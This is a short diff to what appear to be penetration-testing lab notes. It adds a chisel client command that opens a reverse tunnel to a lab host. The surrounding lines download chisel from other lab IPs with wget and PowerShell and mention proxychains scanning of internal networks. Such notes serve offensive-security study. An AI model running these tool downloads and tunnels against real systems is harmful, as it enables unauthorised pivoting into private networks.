@@ -329,6 +329,8 @@ wget http://192.168.45.234/chisel -O chisel
 
 # access the internal webpage at 127.0.0.1:8001 - actually cannot access the webpage but the exploit will still work
 ./chisel
+# may need to set up chisel server using the target's open ports
+./chisel client 192.168.45.160:80 R:60002:0.0.0.0:60002
 
 # use with proxychains for scanning internal networks
 iwr -uri http://192.168.45.242:8000/chisel.exe -Outfile chisel.exe
